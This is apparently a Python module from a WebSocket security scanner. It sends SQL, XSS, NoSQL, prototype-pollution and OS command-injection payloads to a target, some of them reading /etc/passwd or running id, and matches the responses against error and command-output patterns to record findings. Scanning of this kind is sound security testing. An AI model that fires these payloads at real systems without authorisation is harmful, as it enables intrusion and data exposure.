"""
Injection Attack Module
SQL, XSS, Command, NoSQL, Prototype Pollution
Zero false positives — only report with CONFIRMED evidence
"""
import asyncio
import json
import re
import time
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── SQL Error Signatures ──────────────────────────────────────────────────────
SQL_ERRORS = [
    (r"you have an error in your sql syntax",          "MySQL"),
    (r"warning:\s*mysql",                               "MySQL"),
    (r"org\.postgresql\.util\.psqlexception",           "PostgreSQL"),
    (r"pg::syntaxerror",                                "PostgreSQL"),
    (r"microsoft ole db provider for sql server",       "MSSQL"),
    (r"odbc sql server driver",                         "MSSQL"),
    (r"ora-\d{4,5}:",                                   "Oracle"),
    (r"sqlite[_\.]?exception",                          "SQLite"),
    (r"syntax error.*?near",                            "Generic SQL"),
    (r"unclosed quotation mark",                        "MSSQL"),
    (r"quoted string not properly terminated",          "Oracle"),
    (r"sql command not properly ended",                 "Oracle"),
    (r"division by zero",                               "SQL arithmetic"),
    (r"invalid input syntax for",                       "PostgreSQL"),
    (r"column .+? does not exist",                      "PostgreSQL"),
    (r"unknown column",                                 "MySQL"),
    (r"table .+? doesn.t exist",                        "MySQL"),
]

# ── XSS — only flag if NOT inside JSON string ─────────────────────────────────
XSS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
]

XSS_CONFIRMED_PATTERNS = [
    r'<script[\s>].*?</script>',
    r'<img[^>]+onerror\s*=',
    r'<svg[^>]+onload\s*=',
    r'javascript\s*:\s*alert',
    r'onerror\s*=\s*alert',
]

# ── SQLi Payloads ─────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1; SELECT 1",
    "' UNION SELECT NULL--",
    "'; SELECT SLEEP(0)--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 'x'='x",
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    '; id',
    '| id',
    '`id`',
    '; whoami',
    '| cat /etc/passwd',
    '; ls -la',
    '&& id',
    '$(id)',
]

CMD_CONFIRMED = [
    r'uid=\d+\(.+?\)\s+gid=\d+',
    r'root:.*?:0:0:',
    r'total\s+\d+\n.+?[-drwx]{10}',
    r'volume serial number',
    r'directory of [a-z]:\\',
]

# ── NoSQL ─────────────────────────────────────────────────────────────────────
NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
]

NOSQL_ERRORS = [
    r'mongoerror',
    r'casterror',
    r'\$where.*error',
    r'bson.*invalid',
    r'illegal key.*\$',
]

# ── Proto Pollution ───────────────────────────────────────────────────────────
PROTO_PAYLOADS = [
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": true, "role": "admin"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
]


async def run_injection_tests(ws_url: str, fast_mode: bool = False) -> list:
    """Run all injection tests. Returns list of confirmed findings."""
    results = []

    payload_limit = 5 if fast_mode else len(SQLI_PAYLOADS)

    try:
        async with await ws_connect(ws_url, timeout=6) as ws:

            # ── Baseline response ─────────────────────────────────────────
            baseline = await send_recv(ws, '{"type":"ping","q":"hello"}', timeout=3)
            baseline_str = str(baseline or '')

            # ── SQL Injection ─────────────────────────────────────────────
            for payload in SQLI_PAYLOADS[:payload_limit]:
                for fmt in [
                    json.dumps({"query": payload}),
                    json.dumps({"search": payload}),
                    json.dumps({"username": payload}),
                    json.dumps({"input": payload}),
                ]:
                    resp = await send_recv(ws, fmt, timeout=3)
                    if not resp:
                        continue
                    resp_lower = resp.lower()

                    for pattern, db_type in SQL_ERRORS:
                        if re.search(pattern, resp_lower, re.IGNORECASE):
                            ev = Evidence.make(
                                payload=payload,
                                request=fmt,
                                response=resp[:300],
                                proof=f"DB error signature '{db_type}' matched: {pattern}",
                                reproduce=(
                                    f"1. Connect to {ws_url}\n"
                                    f"2. Send: {fmt}\n"
                                    f"3. Observe DB error in response"
                                )
                            )
                            added = store.add(ws_url, 'SQL Injection (Error-Based)', 'CRITICAL',
                                f"Database error revealed via payload injection.\n"
                                f"Database: {db_type}\n"
                                f"Payload: {payload}\n"
                                f"Error pattern: {pattern}", ev)
                            if added:
                                results.append('sqli')
                                log.warning(f"CRITICAL: SQL Injection on {ws_url}")
                            return results  # Stop — confirmed

            # ── XSS — only in non-JSON context ────────────────────────────
            for payload in XSS_PAYLOADS:
                fmt = json.dumps({"message": payload})
                resp = await send_recv(ws, fmt, timeout=3)
                if not resp:
                    continue

                # Parse response — if it's JSON, check if payload escaped HTML context
                is_confirmed = False
                try:
                    parsed = json.loads(resp)
                    resp_str = json.dumps(parsed)
                    # Only XSS if payload appears outside quotes — i.e. rendered as HTML
                    for pat in XSS_CONFIRMED_PATTERNS:
                        if re.search(pat, resp, re.IGNORECASE):
                            is_confirmed = True
                            break
                except Exception:
                    # Raw text — direct check
                    for pat in XSS_CONFIRMED_PATTERNS:
                        if re.search(pat, resp, re.IGNORECASE):
                            is_confirmed = True
                            break

                if is_confirmed:
                    ev = Evidence.make(
                        payload=payload,
                        request=fmt,
                        response=resp[:300],
                        proof="XSS payload executed/reflected outside JSON string context",
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send: {fmt}\n"
                            f"3. Observe unescaped HTML/JS in response"
                        )
                    )
                    store.add(ws_url, 'Reflected XSS via WebSocket', 'HIGH',
                        f"XSS payload reflected without HTML encoding.\n"
                        f"Payload: {payload}", ev)
                    results.append('xss')
                    break

            # ── Command Injection ─────────────────────────────────────────
            if not fast_mode:
                for payload in CMD_PAYLOADS:
                    for fmt in [
                        json.dumps({"host": payload}),
                        json.dumps({"cmd": payload}),
                        json.dumps({"exec": payload}),
                        json.dumps({"ping": payload}),
                    ]:
                        resp = await send_recv(ws, fmt, timeout=4)
                        if not resp:
                            continue
                        for pat in CMD_CONFIRMED:
                            if re.search(pat, resp, re.IGNORECASE | re.DOTALL):
                                ev = Evidence.make(
                                    payload=payload,
                                    request=fmt,
                                    response=resp[:300],
                                    proof=f"OS command output detected: {pat}",
                                    reproduce=(
                                        f"1. Connect to {ws_url}\n"
                                        f"2. Send: {fmt}\n"
                                        f"3. Observe command output in response"
                                    )
                                )
                                store.add(ws_url, 'OS Command Injection', 'CRITICAL',
                                    f"OS command executed via WebSocket message.\n"
                                    f"Payload: {payload}\n"
                                    f"Output pattern: {pat}", ev)
                                results.append('cmdi')
                                return results

            # ── NoSQL ─────────────────────────────────────────────────────
            for payload in NOSQL_PAYLOADS:
                resp = await send_recv(ws, payload, timeout=3)
                if not resp:
                    continue
                for pat in NOSQL_ERRORS:
                    if re.search(pat, resp.lower(), re.IGNORECASE):
                        ev = Evidence.make(
                            payload=payload,
                            request=payload,
                            response=resp[:300],
                            proof=f"NoSQL error: {pat}"
                        )
                        store.add(ws_url, 'NoSQL Injection', 'CRITICAL',
                            f"NoSQL injection confirmed via error response.\n"
                            f"Payload: {payload}", ev)
                        results.append('nosql')
                        break

            # ── Prototype Pollution ───────────────────────────────────────
            for payload in PROTO_PAYLOADS:
                resp = await send_recv(ws, payload, timeout=3)
                if not resp:
                    continue
                resp_lower = resp.lower()
                # Only flag if injected property is reflected back as true
                if ('"admin":true' in resp_lower or '"isadmin":true' in resp_lower
                        or '"role":"admin"' in resp_lower):
                    ev = Evidence.make(
                        payload=payload,
                        request=payload,
                        response=resp[:300],
                        proof="Injected __proto__ property reflected in response as true",
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send: {payload}\n"
                            f"3. Observe admin=true in response"
                        )
                    )
                    store.add(ws_url, 'Prototype Pollution', 'HIGH',
                        f"Prototype pollution confirmed — injected property reflected.\n"
                        f"Payload: {payload}", ev)
                    results.append('proto')
                    break

    except asyncio.TimeoutError:
        log.debug(f"Timeout on injection tests: {ws_url}")
    except Exception as e:
        log.debug(f"Injection test error on {ws_url}: {e}")

    return results
